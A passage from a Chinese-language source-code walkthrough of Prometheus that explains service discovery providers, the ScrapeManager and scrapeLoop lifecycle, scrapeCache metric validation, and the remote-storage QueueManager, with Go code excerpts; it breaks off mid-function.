\"marathon\"))\n\t\tif err != nil {\n\t\t\tlevel.Error(m.logger).Log(\"msg\", \"Cannot create Marathon discovery\", \"err\", err)\n\t\t\tcontinue\n\t\t}\n\t\tapp(\"marathon\", i, t)\n\t}\n\tfor i, c := range cfg.KubernetesSDConfigs {\n\t\tk, err := kubernetes.New(log.With(m.logger, \"discovery\", \"k8s\"), c)\n\t\tif err != nil {\n\t\t\tlevel.Error(m.logger).Log(\"msg\", \"Cannot create Kubernetes discovery\", \"err\", err)\n\t\t\tcontinue\n\t\t}\n\t\tapp(\"kubernetes\", i, k)\n\t}\n\tfor i, c := range cfg.ServersetSDConfigs {\n\t\tapp(\"serverset\", i, zookeeper.NewServersetDiscovery(c, log.With(m.logger, \"discovery\", \"zookeeper\")))\n\t}\n\tfor i, c := range cfg.NerveSDConfigs {\n\t\tapp(\"nerve\", i, zookeeper.NewNerveDiscovery(c, log.With(m.logger, \"discovery\", \"nerve\")))\n\t}\n\tfor i, c := range cfg.EC2SDConfigs {\n\t\tapp(\"ec2\", i, ec2.NewDiscovery(c, log.With(m.logger, \"discovery\", \"ec2\")))\n\t}\n\tfor i, c := range cfg.OpenstackSDConfigs {\n\t\topenstackd, err := openstack.NewDiscovery(c, log.With(m.logger, \"discovery\", \"openstack\"))\n\t\tif err != nil {\n\t\t\tlevel.Error(m.logger).Log(\"msg\", \"Cannot initialize OpenStack discovery\", \"err\", err)\n\t\t\tcontinue\n\t\t}\n\t\tapp(\"openstack\", i, openstackd)\n\t}\n\n\tfor i, c := range cfg.GCESDConfigs {\n\t\tgced, err := gce.NewDiscovery(*c, log.With(m.logger, \"discovery\", \"gce\"))\n\t\tif err != nil {\n\t\t\tlevel.Error(m.logger).Log(\"msg\", \"Cannot initialize GCE discovery\", \"err\", err)\n\t\t\tcontinue\n\t\t}\n\t\tapp(\"gce\", i, gced)\n\t}\n\tfor i, c := range cfg.AzureSDConfigs {\n\t\tapp(\"azure\", i, azure.NewDiscovery(c, log.With(m.logger, \"discovery\", \"azure\")))\n\t}\n\tfor i, c := range cfg.TritonSDConfigs {\n\t\tt, err := triton.New(log.With(m.logger, \"discovery\", \"trition\"), c)\n\t\tif err != nil {\n\t\t\tlevel.Error(m.logger).Log(\"msg\", \"Cannot create Triton discovery\", \"err\", err)\n\t\t\tcontinue\n\t\t}\n\t\tapp(\"triton\", i, t)\n\t}\n\tif len(cfg.StaticConfigs) > 0 {\n\t\tapp(\"static\", 0, NewStaticProvider(cfg.StaticConfigs))\n\t}\n\n\treturn providers\n}\n```\n\n调用startProvider启动服务：\n\n```go\nfunc (m *Manager) startProvider(ctx context.Context, poolKey poolKey, worker Discoverer) {\n\tctx, cancel := context.WithCancel(ctx)\n\tupdates := make(chan []*targetgroup.Group)\n\n\tm.discoverCancel = append(m.discoverCancel, cancel)\n\n\tgo worker.Run(ctx, updates)\n\tgo m.runProvider(ctx, poolKey, updates)\n}\n\nfunc (m *Manager) runProvider(ctx context.Context, poolKey poolKey, updates chan []*targetgroup.Group) {\n\tfor {\n\t\tselect {\n\t\tcase <-ctx.Done():\n\t\t\treturn\n\t\tcase tgs, ok := <-updates:\n\t\t\t// Handle the case that a target provider exits and closes the channel\n\t\t\t// before the context is done.\n\t\t\tif !ok {\n\t\t\t\treturn\n\t\t\t}\n\t\t\tm.updateGroup(poolKey, tgs)\n\t\t\tm.syncCh <- m.allGroups()\n\t\t}\n\t}\n}\n```\n\n各个服务在discovery目录中对应的服务启动。如DNS Discovery服务在完成启动之后，runProvider将接收更新之后的服务信息updates，并将新的服务信息通过updateGroup方法同步到targets列表，在调用allgroups方法完成对服务快照信息的构建，发送到指标的管理器中ScraperManager。\n\n流程：\n\n![1572414553678](/images/1572414553678.png)\n\n## ScrapeManager\n\nscrapeManager组件的采集周期在prometheus.yml配置文件中由global节点下的scrape_interval指定，各个job_name可以在scrape_configs下进行个性化的设置，设置符合自身场景的scrape_interval\n\n指标采集是指从发现的服务中定时获取指标数据。prometheus在启动的过程中会完成对scrapeManager的初始化，初始化过程包括构建scrapeManager实列，加载配置启动scrapeManager实例三个。scrapeManager复制维护scrapePool，并管理scrape组件的生命周期\n\nScrapeManager通过调用NewScrapeManager方法完成对scapeManager实例的创建。\n\n```go\n// ScrapeManager maintains a set of scrape pools and manages start/stop cycles\n// when receiving new target groups form the discovery manager.\ntype ScrapeManager struct {\n\tlogger        log.Logger\n\tappend        Appendable    //指标存储器\n\tscrapeConfigs map[string]*config.ScrapeConfig  //job_name scrape配置\n\tscrapePools   map[string]*scrapePool  //job_name指标采集器\n\tmtx           sync.RWMutex //同步访问控制，读写锁\n\tgraceShut     chan struct{}  //scrapemanager关闭控制\n}\n\n```\n\n初始化ScrapeManager结构;\n\n```go\n// NewScrapeManager is the ScrapeManager constructor\nfunc NewScrapeManager(logger log.Logger, app Appendable) *ScrapeManager {\n\n\treturn &ScrapeManager{\n\t\tappend:        app,\n\t\tlogger:        logger,\n\t\tscrapeConfigs: make(map[string]*config.ScrapeConfig),\n\t\tscrapePools:   make(map[string]*scrapePool),\n\t\tgraceShut:     make(chan struct{}),\n\t}\n}\n```\n\nscrapeManager的配置加载，是根据prometheus.yml中的scrape_configs配置项，对scrape服务进行配置更新处理，调用方法为ApplyConfig，器内部实现分初次加载和配置更新动态加载两种。\n\n```go\n// ScrapeConfig configures a scraping unit for Prometheus.\ntype ScrapeConfig struct {\n\t// The job name to which the job label is set by default.\n\tJobName string `yaml:\"job_name\"`\n\t// Indicator whether the scraped metrics should remain unmodified.\n\tHonorLabels bool `yaml:\"honor_labels,omitempty\"`\n\t// A set of query parameters with which the target is scraped.\n\tParams url.Values `yaml:\"params,omitempty\"`\n\t// How frequently to scrape the targets of this scrape config.\n\tScrapeInterval model.Duration `yaml:\"scrape_interval,omitempty\"`\n\t// The timeout for scraping targets of this config.\n\tScrapeTimeout model.Duration `yaml:\"scrape_timeout,omitempty\"`\n\t// The HTTP resource path on which to fetch metrics from targets.\n\tMetricsPath string `yaml:\"metrics_path,omitempty\"`\n\t// The URL scheme with which to fetch metrics from targets.\n\tScheme string `yaml:\"scheme,omitempty\"`\n\t// More than this many samples post metric-relabelling will cause the scrape to fail.\n\tSampleLimit uint `yaml:\"sample_limit,omitempty\"`\n\n\t// We cannot do proper Go type embedding below as the parser will then parse\n\t// values arbitrarily into the overflow maps of further-down types.\n\n\tServiceDiscoveryConfig sd_config.ServiceDiscoveryConfig `yaml:\",inline\"`\n\tHTTPClientConfig       config_util.HTTPClientConfig     `yaml:\",inline\"`\n\n\t// List of target relabel configurations.\n\tRelabelConfigs []*RelabelConfig `yaml:\"relabel_configs,omitempty\"`\n\t// List of metric relabel configurations.\n\tMetricRelabelConfigs []*RelabelConfig `yaml:\"metric_relabel_configs,omitempty\"`\n\n\t// Catches all undefined fields and must be empty after parsing.\n\tXXX map[string]interface{} `yaml:\",inline\"`\n}\n\n// ApplyConfig resets the manager's target providers and job configurations as defined by the new cfg.\nfunc (m *ScrapeManager) ApplyConfig(cfg *config.Config) error {\n\tm.mtx.Lock()\n\tdefer m.mtx.Unlock()\n\tc := make(map[string]*config.ScrapeConfig)\n\tfor _, scfg := range cfg.ScrapeConfigs {\n\t\tc[scfg.JobName] = scfg\n\t}\n\tm.scrapeConfigs = c\n\n\t// Cleanup and reload pool if config has changed.\n\tfor name, sp := range m.scrapePools {\n\t\tif cfg, ok := m.scrapeConfigs[name]; !ok {\n\t\t\tsp.stop()\n\t\t\tdelete(m.scrapePools, name)\n\t\t} else if !reflect.DeepEqual(sp.config, cfg) {\n\t\t\tsp.reload(cfg)\n\t\t}\n\t}\n\n\treturn nil\n}\n```\n\nsp.reload方法将重新配置scrapePool，流程为：\n\n1. 构建scrapeLoop服务\n\n2. 停止线上所对应的scrapeLoop服务\n3. 启动新的scrapeLoop服务\n\n以上三步动态更新；\n\n```go\n// reload the scrape pool with the given scrape configuration. The target state is preserved\n// but all scrape loops are restarted with the new scrape configuration.\n// This method returns after all scrape loops that were stopped have stopped scraping.\nfunc (sp *scrapePool) reload(cfg *config.ScrapeConfig) {\n\tstart := time.Now()\n\n\tsp.mtx.Lock()\n\tdefer sp.mtx.Unlock()\n\n\tclient, err := httputil.NewClientFromConfig(cfg.HTTPClientConfig, cfg.JobName)\n\tif err != nil {\n\t\t// Any errors that could occur here should be caught during config validation.\n\t\tlevel.Error(sp.logger).Log(\"msg\", \"Error creating HTTP client\", \"err\", err)\n\t}\n\tsp.config = cfg\n\tsp.client = client\n\n\tvar (\n\t\twg       sync.WaitGroup\n\t\tinterval = time.Duration(sp.config.ScrapeInterval)\n\t\ttimeout  = time.Duration(sp.config.ScrapeTimeout)\n\t)\n\n\tfor fp, oldLoop := range sp.loops {\n\t\tvar (\n\t\t\tt       = sp.targets[fp]\n\t\t\ts       = &targetScraper{Target: t, client: sp.client, timeout: timeout}\n\t\t\tnewLoop = sp.newLoop(t, s)\n\t\t)\n\t\twg.Add(1)\n\n\t\tgo func(oldLoop, newLoop loop) {\n            //停止线上的老的scrapeLoop服务\n\t\t\toldLoop.stop()\n\t\t\twg.Done()\n\t\t\t//启动新的scrapeLoop服务\n\t\t\tgo newLoop.run(interval, timeout, nil)\n\t\t}(oldLoop, newLoop)\n\t\t//更新scrapePool中的scrapeLoop服务\n\t\tsp.loops[fp] = newLoop\n\t}\n\n\twg.Wait()\n\t//更新采集周期\t\ttargetReloadIntervalLength.WithLabelValues(interval.String()).Observe(\n\t\ttime.Since(start).Seconds(),\n\t)\n}\n```\n\n配置加载流程：\n\n![1572415259519](/images/1572415259519.png)\n\nScrapeManager通过调用retrieval下的Manager.Run方法完成启动，其参数为prometheus.yml配置发现的目标服务，有discovery模块中的Manager.SyncCh 方法负责和ScrapeManager通信。\n\n当SyncSh发生变化时，将触发ScrapeManager中的reload方法，在reload方法中会遍历目标服务，根据tsetName（jobName）从scrapePools中查找scrapePool，如果找不到则新建一个scrapePool，使得每个job都有一个对应的scrapePool\n\n```go\n// Run starts background processing to handle target updates and reload the scraping loops.\nfunc (m *ScrapeManager) Run(tsets <-chan map[string][]*targetgroup.Group) error {\n\tlevel.Info(m.logger).Log(\"msg\", \"Starting scrape manager...\")\n\n\tfor {\n\t\tselect {\n\t\tcase ts := <-tsets:\n\t\t\tm.reload(ts)\n\t\tcase <-m.graceShut:\n\t\t\treturn nil\n\t\t}\n\t}\n```\n\n```go\nfunc (m *ScrapeManager) reload(t map[string][]*targetgroup.Group) {\n\tfor tsetName, tgroup := range t {\n\t\tscrapeConfig, ok := m.scrapeConfigs[tsetName]\n\t\tif !ok {\n\t\t\tlevel.Error(m.logger).Log(\"msg\", \"error reloading target set\", \"err\", fmt.Sprintf(\"invalid config id:%v\", tsetName))\n\t\t\tcontinue\n\t\t}\n\t\t//检查ScrapePool中服务是否存在，不存在构建新的ScrapePool\n\t\t// Scrape pool doesn't exist so start a new one.\n\t\texisting, ok := m.scrapePools[tsetName]\n\t\tif !ok {\n\t\t\tsp := newScrapePool(scrapeConfig, m.append, log.With(m.logger, \"scrape_pool\", tsetName))\n\t\t\tm.scrapePools[tsetName] = sp\n\t\t\tsp.Sync(tgroup)\n\t\t\t//调用Sync方法同步目标服务和启动scrape\n\t\t} else {\n            //同步目标服务并启动scrape\n\t\t\texisting.Sync(tgroup)\n\t\t}\n\t}\n}\n```\n\nsp.Sync方法主要用于将tgroup转换为Target类型，再调用scrapePool.sync方法同步scrape服务。\n\nScrapePool主要管理目标服务和scrapeLoop\n\nSync方法具体实现：\n\n```go\n// Sync converts target groups into actual scrape targets and synchronizes\n// the currently running scraper with the resulting set.\nfunc (sp *scrapePool) Sync(tgs []*targetgroup.Group) {\n\tstart := time.Now()\n\n\tvar all []*Target\n\tsp.mtx.Lock()\n\tsp.droppedTargets = []*Target{}\n\tfor _, tg := range tgs {\n        //Group转换成target\n\t\ttargets, err := targetsFromGroup(tg, sp.config)\n\t\tif err != nil {\n\t\t\tlevel.Error(sp.logger).Log(\"msg\", \"creating targets failed\", \"err\", err)\n\t\t\tcontinue\n\t\t}\n\t\tfor _, t := range targets {\n            //检查Target是否存在有有效的Label\n\t\t\tif t.Labels().Len() > 0 {\n\t\t\t\tall = append(all, t)\n                //记录无效的Target\n\t\t\t} else if t.DiscoveredLabels().Len() > 0 {\n\t\t\t\tsp.droppedTargets = append(sp.droppedTargets, t)\n\t\t\t}\n\t\t}\n\t}\n\tsp.mtx.Unlock()\n    //同步scrape服务\n\tsp.sync(all)\n//更新系统指标\n\ttargetSyncIntervalLength.WithLabelValues(sp.config.JobName).Observe(\n\t\ttime.Since(start).Seconds(),\n\t)\n\ttargetScrapePoolSyncsCounter.WithLabelValues(sp.config.JobName).Inc()\n}\n```\n\nscrapePool.sync方法将输入参数targets与原有的targets列表sp.targets进行对比，如果有新的target加入，就创建新的targetScraper和scrapeLoop，并且启动新的scrapeLoop，如果发现已经失效的target,就会停止scrapeLoop服务并删除对应的target和scrapeLoop\n\n```go\n// sync takes a list of potentially duplicated targets, deduplicates them, starts\n// scrape loops for new targets, and stops scrape loops for disappeared targets.\n// It returns after all stopped scrape loops terminated.\nfunc (sp *scrapePool) sync(targets []*Target) {\n\tsp.mtx.Lock()\n\tdefer sp.mtx.Unlock()\n\n\tvar (\n\t\tuniqueTargets = map[uint64]struct{}{}\n\t\tinterval      = time.Duration(sp.config.ScrapeInterval)\n\t\ttimeout       = time.Duration(sp.config.ScrapeTimeout)\n\t)\n\n\tfor _, t := range targets {\n\t\tt := t\n\t\thash := t.hash()\n\t\tuniqueTargets[hash] = struct{}{}\n\n\t\tif _, ok := sp.targets[hash]; !ok {\n\t\t\ts := &targetScraper{Target: t, client: sp.client, timeout: timeout}\n\t\t\tl := sp.newLoop(t, s)\n\n\t\t\tsp.targets[hash] = t\n\t\t\tsp.loops[hash] = l\n\n\t\t\tgo l.run(interval, timeout, nil)\n\t\t}\n\t}\n\n\tvar wg sync.WaitGroup\n\n\t// Stop and remove old targets and scraper loops.\n\tfor hash := range sp.targets {\n\t\tif _, ok := uniqueTargets[hash]; !ok {\n\t\t\twg.Add(1)\n\t\t\tgo func(l loop) {\n\t\t\t\tl.stop()\n\t\t\t\twg.Done()\n\t\t\t}(sp.loops[hash])\n\n\t\t\tdelete(sp.loops, hash)\n\t\t\tdelete(sp.targets, hash)\n\t\t}\n\t}\n\n\t// Wait for all potentially stopped scrapers to terminate.\n\t// This covers the case of flapping targets. If the server is under high load, a new scraper\n\t// may be active and tries to insert. The old scraper that didn't terminate yet could still\n\t// be inserting a previous sample set.\n\twg.Wait()\n}\n```\n\nscrapeLoop是scrape的直接管理者，每个scrapeLoop都通过一个goroutine来运行，scrapeLoop控制scrape进行指标的拉取\n\n```go\nfunc (sl *scrapeLoop) run(interval, timeout time.Duration, errc chan<- error) {\n\tselect {\n\tcase <-time.After(sl.scraper.offset(interval)):\n\t\t// Continue after a scraping offset.\n\tcase <-sl.scrapeCtx.Done():\n\t\tclose(sl.stopped)\n\t\treturn\n\t}\n\n\tvar last time.Time\n     \n\tticker := time.NewTicker(interval)\n\tdefer ticker.Stop()\n    //初始化指标存储空间\n\tbuf := bytes.NewBuffer(make([]byte, 0, 16000))\n\nmainLoop:\n\tfor {\n\t\tbuf.Reset()\n\t\tselect {\n            //停止scrapeLoop\n\t\tcase <-sl.ctx.Done():\n\t\t\tclose(sl.stopped)\n\t\t\treturn\n\t\tcase <-sl.scrapeCtx.Done():\n\t\t\tbreak mainLoop\n\t\tdefault:\n\t\t}\n\n\t\tvar (\n\t\t\tstart             = time.Now()\n\t\t\tscrapeCtx, cancel = context.WithTimeout(sl.ctx, timeout)\n\t\t)\n\n\t\t// Only record after the first scrape.\n\t\tif !last.IsZero() {\n\t\t\ttargetIntervalLength.WithLabelValues(interval.String()).Observe(\n\t\t\t\ttime.Since(last).Seconds(),\n\t\t\t)\n\t\t}\n        //根据最后一次的scrape到指标的大小来申请本次存储空间\n\t\tb := sl.buffers.Get(sl.lastScrapeSize)\n\t\tbuf := bytes.NewBuffer(b)\n\t\t//scrape指标\n\t\tscrapeErr := sl.scraper.scrape(scrapeCtx, buf)\n\t\tcancel()\n\n\t\tif scrapeErr == nil {\n\t\t\tb = buf.Bytes()\n\t\t\t// NOTE: There were issues with misbehaving clients in the past\n\t\t\t// that occasionally returned empty results. We don't want those\n\t\t\t// to falsely reset our buffer size.\n\t\t\tif len(b) > 0 {\n                //记录本次scrape到指标的大小\n\t\t\t\tsl.lastScrapeSize = len(b)\n\t\t\t}\n\t\t} else {\n\t\t\tlevel.Debug(sl.l).Log(\"msg\", \"Scrape failed\", \"err\", scrapeErr.Error())\n\t\t\tif errc != nil {\n\t\t\t\terrc <- scrapeErr\n\t\t\t}\n\t\t}\n\n\t\t// A failed scrape is the same as an empty scrape,\n\t\t// we still call sl.append to trigger stale markers.\n        //存储指标\n\t\ttotal, added, appErr := sl.append(b, start)\n\t\tif appErr != nil {\n\t\t\tlevel.Warn(sl.l).Log(\"msg\", \"append failed\", \"err\", appErr)\n\t\t\t// The append failed, probably due to a parse error or sample limit.\n\t\t\t// Call sl.append again with an empty scrape to trigger stale markers.\n\t\t\tif _, _, err := sl.append([]byte{}, start); err != nil {\n\t\t\t\tlevel.Warn(sl.l).Log(\"msg\", \"append failed\", \"err\", err)\n\t\t\t}\n\t\t}\n\t\t//对象复用\n\t\tsl.buffers.Put(b)\n\n\t\tif scrapeErr == nil {\n\t\t\tscrapeErr = appErr\n\t\t}\n\t\t//统计采集到的指标\n\t\tsl.report(start, time.Since(start), total, added, scrapeErr)\n\t\tlast = start\n\n\t\tselect {\n\t\tcase <-sl.ctx.Done():\n\t\t\tclose(sl.stopped)\n\t\t\treturn\n\t\tcase <-sl.scrapeCtx.Done():\n\t\t\tbreak mainLoop\n\t\tcase <-ticker.C:\n\t\t}\n\t}\n\n\tclose(sl.stopped)\n\n\tsl.endOfRunStaleness(last, ticker, interval)\n}\n```\n\nrun方法中调用sl.scraper.scrape进行指标采集，并将采集到的指标通过sl.append方法进行存储。\n\n再scrape过程中为了提供性能，使用sync.Pool机制来复用对象，再每次scrape后都会向pool申请和scrape结果相同大小的byte slice，并添加到sl.buffers中，以便供下一次获取指标使用\n\n流程：\n\n![1572416216523](/images/1572416216523.png)\n\n## LocalStorage/RemoteStorage\n\nPrometheus再通过scrape获取指标后，调用scrapeLoop.append方法将指标存储到fanoutStorage组件中，但再scrape与fanoutStorage之间加了一层scrapeCache，用于指标合法行校验。\n\nscrapeCache缓存了两种不合法的指标：\n\n1）指标纬度为空，无效指标\n\n2）连续两次指标存储中，第一次存储的不带时间戳指标再第二次存储的不带时间戳指标中不存在，这部分指标过期指标\n\nscrapeCache:\n\n```go\n// scrapeCache tracks mappings of exposed metric strings to label sets and\n// storage references. Additionally, it tracks staleness of series between\n// scrapes.\ntype scrapeCache struct {\n\titer uint64 // Current scrape iteration.\n\t// 被缓存的批次数\n\t// Parsed string to an entry with information about the actual label set\n\t// and its storage reference.\n\tentries map[string]*cacheEntry\n\t// 缓存本次采集的指标\n\t// Cache of dropped metric strings and their iteration. The iteration must\n\t// be a pointer so we can update it without setting a new entry with an unsafe\n\t// string in addDropped().\n\tdropped map[string]*uint64\n    //缓存本次采集的指标\n\n\t// seriesCur and seriesPrev store the labels of series that were seen\n\t// in the current and previous scrape.\n\t// We hold two maps and swap them out to save allocations.\n\tseriesCur  map[uint64]labels.Labels\n\tseriesPrev map[uint64]labels.Labels\n    //缓存上次采集的指标\n}\n\nfunc newScrapeCache() *scrapeCache {\n\treturn &scrapeCache{\n\t\tentries:    map[string]*cacheEntry{},\n\t\tdropped:    map[string]*uint64{},\n\t\tseriesCur:  map[uint64]labels.Labels{},\n\t\tseriesPrev: map[uint64]labels.Labels{},\n\t}\n}\n```\n\nscrapeCache主要方法：\n\niterDone()；用于scrapeCache缓存整理\n\nget:根据指标信息met获取cacheEntry结构\n\naddRef：根据指标信息增加cacheEntry节点\n\naddDropped:添加无效指标信息到dropped\n\ngetDropped: 判断met是否为无效指标\n\ntrackStaleness:添加不带时间戳的指标到seriesCur列表\n\nforEachStale：查找过期的指标\n\n```go\nfunc (sl *scrapeLoop) append(b []byte, ts time.Time) (total, added int, err error) {\n\tvar (\n\t\tapp            = sl.appender()\n\t\tp              = textparse.New(b)\n\t\tdefTime        = timestamp.FromTime(ts)\n\t\tnumOutOfOrder  = 0\n\t\tnumDuplicates  = 0\n\t\tnumOutOfBounds = 0\n\t)\n\tvar sampleLimitErr error\n\nloop:\n\tfor p.Next() {\n\t\ttotal++\n\n\t\tt := defTime\n\t\tmet, tp, v := p.At()\n\t\tif tp != nil {\n\t\t\tt = *tp\n\t\t}\n\n\t\tif sl.cache.getDropped(yoloString(met)) {\n\t\t\tcontinue\n\t\t}\n\t\tce, ok := sl.cache.get(yoloString(met))\n\t\tif ok {\n\t\t\tswitch err = app.AddFast(ce.lset, ce.ref, t, v); err {\n\t\t\tcase nil:\n\t\t\t\tif tp == nil {\n\t\t\t\t\tsl.cache.trackStaleness(ce.hash, ce.lset)\n\t\t\t\t}\n\t\t\tcase storage.ErrNotFound:\n\t\t\t\tok = false\n\t\t\tcase storage.ErrOutOfOrderSample:\n\t\t\t\tnumOutOfOrder++\n\t\t\t\tlevel.Debug(sl.l).Log(\"msg\", \"Out of order sample\", \"series\", string(met))\n\t\t\t\ttargetScrapeSampleOutOfOrder.Inc()\n\t\t\t\tcontinue\n\t\t\tcase storage.ErrDuplicateSampleForTimestamp:\n\t\t\t\tnumDuplicates++\n\t\t\t\tlevel.Debug(sl.l).Log(\"msg\", \"Duplicate sample for timestamp\", \"series\", string(met))\n\t\t\t\ttargetScrapeSampleDuplicate.Inc()\n\t\t\t\tcontinue\n\t\t\tcase storage.ErrOutOfBounds:\n\t\t\t\tnumOutOfBounds++\n\t\t\t\tlevel.Debug(sl.l).Log(\"msg\", \"Out of bounds metric\", \"series\", string(met))\n\t\t\t\ttargetScrapeSampleOutOfBounds.Inc()\n\t\t\t\tcontinue\n\t\t\tcase errSampleLimit:\n\t\t\t\t// Keep on parsing output if we hit the limit, so we report the correct\n\t\t\t\t// total number of samples scraped.\n\t\t\t\tsampleLimitErr = err\n\t\t\t\tadded++\n\t\t\t\tcontinue\n\t\t\tdefault:\n\t\t\t\tbreak loop\n\t\t\t}\n\t\t}\n\t\tif !ok {\n\t\t\tvar lset labels.Labels\n\n\t\t\tmets := p.Metric(&lset)\n\t\t\thash := lset.Hash()\n\n\t\t\t// Hash label set as it is seen local to the target. Then add target labels\n\t\t\t// and relabeling and store the final label set.\n\t\t\tlset = sl.sampleMutator(lset)\n\n\t\t\t// The label set may be set to nil to indicate dropping.\n\t\t\tif lset == nil {\n\t\t\t\tsl.cache.addDropped(mets)\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tvar ref uint64\n\t\t\tref, err = app.Add(lset, t, v)\n\t\t\t// TODO(fabxc): also add a dropped-cache?\n\t\t\tswitch err {\n\t\t\tcase nil:\n\t\t\tcase storage.ErrOutOfOrderSample:\n\t\t\t\terr = nil\n\t\t\t\tnumOutOfOrder++\n\t\t\t\tlevel.Debug(sl.l).Log(\"msg\", \"Out of order sample\", \"series\", string(met))\n\t\t\t\ttargetScrapeSampleOutOfOrder.Inc()\n\t\t\t\tcontinue\n\t\t\tcase storage.ErrDuplicateSampleForTimestamp:\n\t\t\t\terr = nil\n\t\t\t\tnumDuplicates++\n\t\t\t\tlevel.Debug(sl.l).Log(\"msg\", \"Duplicate sample for timestamp\", \"series\", string(met))\n\t\t\t\ttargetScrapeSampleDuplicate.Inc()\n\t\t\t\tcontinue\n\t\t\tcase storage.ErrOutOfBounds:\n\t\t\t\terr = nil\n\t\t\t\tnumOutOfBounds++\n\t\t\t\tlevel.Debug(sl.l).Log(\"msg\", \"Out of bounds metric\", \"series\", string(met))\n\t\t\t\ttargetScrapeSampleOutOfBounds.Inc()\n\t\t\t\tcontinue\n\t\t\tcase errSampleLimit:\n\t\t\t\tsampleLimitErr = err\n\t\t\t\tadded++\n\t\t\t\tcontinue\n\t\t\tdefault:\n\t\t\t\tlevel.Debug(sl.l).Log(\"msg\", \"unexpected error\", \"series\", string(met), \"err\", err)\n\t\t\t\tbreak loop\n\t\t\t}\n\t\t\tif tp == nil {\n\t\t\t\t// Bypass staleness logic if there is an explicit timestamp.\n\t\t\t\tsl.cache.trackStaleness(hash, lset)\n\t\t\t}\n\t\t\tsl.cache.addRef(mets, ref, lset, hash)\n\t\t}\n\t\tadded++\n\t}\n\tif err == nil {\n\t\terr = p.Err()\n\t}\n\tif sampleLimitErr != nil {\n\t\t// We only want to increment this once per scrape, so this is Inc'd outside the loop.\n\t\ttargetScrapeSampleLimit.Inc()\n\t}\n\tif numOutOfOrder > 0 {\n\t\tlevel.Warn(sl.l).Log(\"msg\", \"Error on ingesting out-of-order samples\", \"num_dropped\", numOutOfOrder)\n\t}\n\tif numDuplicates > 0 {\n\t\tlevel.Warn(sl.l).Log(\"msg\", \"Error on ingesting samples with different value but same timestamp\", \"num_dropped\", numDuplicates)\n\t}\n\tif numOutOfBounds > 0 {\n\t\tlevel.Warn(sl.l).Log(\"msg\", \"Error on ingesting samples that are too old or are too far into the future\", \"num_dropped\", numOutOfBounds)\n\t}\n\tif err == nil {\n\t\tsl.cache.forEachStale(func(lset labels.Labels) bool {\n\t\t\t// Series no longer exposed, mark it stale.\n\t\t\t_, err = app.Add(lset, defTime, math.Float64frombits(value.StaleNaN))\n\t\t\tswitch err {\n\t\t\tcase storage.ErrOutOfOrderSample, storage.ErrDuplicateSampleForTimestamp:\n\t\t\t\t// Do not count these in logging, as this is expected if a target\n\t\t\t\t// goes away and comes back again with a new scrape loop.\n\t\t\t\terr = nil\n\t\t\t}\n\t\t\treturn err == nil\n\t\t})\n\t}\n\tif err != nil {\n\t\tapp.Rollback()\n\t\treturn total, added, err\n\t}\n\tif err := app.Commit(); err != nil {\n\t\treturn total, added, err\n\t}\n\n\tsl.cache.iterDone()\n\n\treturn total, added, nil\n}\n```\n\n存储指标append方法的具体实现，\n\n存储指标的流程：\n\n![1572417134533](/images/1572417134533.png)\n\nprometheus支持远程存储，也支持本地存储。\n\nremote中为远程存储，\n\ntsdb中为本地存储\n\n远程存储：存储的数据，发送过来的样本先放入到队列中，这个队列的最大分片是1000，每个分片没秒1000个sample，那么一秒就可以发送1000*1000个sample。\n\n数据结构为：\n\n```go\n// QueueManager manages a queue of samples to be sent to the Storage\n// indicated by the provided StorageClient.\ntype QueueManager struct {\n\tlogger log.Logger\n\n\tcfg            config.QueueConfig                     //队列配置\n\texternalLabels model.LabelSet                         //\n\trelabelConfigs []*config.RelabelConfig \n\tclient         StorageClient                          // 存储客户端\n\tqueueName      string                                 //队列名称\n\tlogLimiter     *rate.Limiter                          //限流\n \n\tshardsMtx   sync.Mutex\n\tshards      *shards                                   //分片\n\tnumShards   int                                       //分片数目\n\treshardChan chan int\n\tquit        chan struct{}\n\twg          sync.WaitGroup\n\n\tsamplesIn, samplesOut, samplesOutDuration *ewmaRate\n\tintegralAccumulator                       float64\n}\n```\n\n构建好发送队列的函数：\n\n```go\n// NewQueueManager builds a new QueueManager.\nfunc NewQueueManager(logger log.Logger, cfg config.QueueConfig, externalLabels model.LabelSet, relabelConfigs []*config.RelabelConfig, client StorageClient) *QueueManager {\n\tif logger == nil {\n\t\tlogger = log.NewNopLogger()\n\t}\n\tt := &QueueManager{\n\t\tlogger:         logger,\n\t\tcfg:            cfg,\n\t\texternalLabels: externalLabels,\n\t\trelabelConfigs: relabelConfigs,\n\t\tclient:         client,\n\t\tqueueName:      client.Name(),\n\n\t\tlogLimiter:  rate.NewLimiter(logRateLimit, logBurst),\n\t\tnumShards:   1,\n\t\treshardChan: make(chan int),\n\t\tquit:        make(chan struct{}),\n\n\t\tsamplesIn:          newEWMARate(ewmaWeight, shardUpdateDuration),\n\t\tsamplesOut:         newEWMARate(ewmaWeight, shardUpdateDuration),\n\t\tsamplesOutDuration: newEWMARate(ewmaWeight, shardUpdateDuration),\n\t}\n\tt.shards = t.newShards(t.numShards)\n\tnumShards.WithLabelValues(t.queueName).Set(float64(t.numShards))\n\tqueueCapacity.WithLabelValues(t.queueName).Set(float64(t.cfg.Capacity))\n\n\t// Initialise counter labels to zero.\n    //初始化\n\tsentBatchDuration.WithLabelValues(t.queueName)                  \n\tsucceededSamplesTotal.WithLabelValues(t.queueName)\n\tfailedSamplesTotal.WithLabelValues(t.queueName)\n\tdroppedSamplesTotal.WithLabelValues(t.queueName)\n\treturn t\n}\n```\n\n调用append方法来添加样本数据到队列分片中\n\n```go\n// Append queues a sample to be sent to the remote storage. It drops the\n// sample on the floor if the queue is full.\n// Always returns nil.\nfunc (t *QueueManager) Append(s *model.Sample) error {\n\tvar snew model.Sample\n\tsnew = *s\n\tsnew.Metric = s.Metric.Clone()\n\n\tfor ln, lv := range t.externalLabels {\n\t\tif _, ok := s.Metric[ln]; !ok {\n\t\t\tsnew.Metric[ln] = lv\n\t\t}\n\t}\n\n\tsnew.Metric = model.Metric(\n\t\trelabel.Process(model.LabelSet(snew.Metric), t.relabelConfigs...))\n\n\tif snew.Metric == nil {\n\t\treturn nil\n\t}\n\n\tt.shardsMtx.Lock()\n\tenqueued := t.shards.enqueue(&snew)\n\tt.shardsMtx.Unlock()\n\n\tif enqueued {\n\t\tqueueLength.WithLabelValues(t.queueName).Inc()\n\t} else {\n\t\tdroppedSamplesTotal.WithLabelValues(t.queueName).Inc()\n\t\tif t.logLimiter.Allow() {\n\t\t\tlevel.Warn(t.logger).Log(\"msg\", \"Remote storage queue full, discarding sample. Multiple subsequent messages of this kind may be suppressed.\")\n\t\t}\n\t}\n\treturn nil\n}\n```\n\n其中使用的函数enqueue发送到队列里面：\n\n```go\nfunc 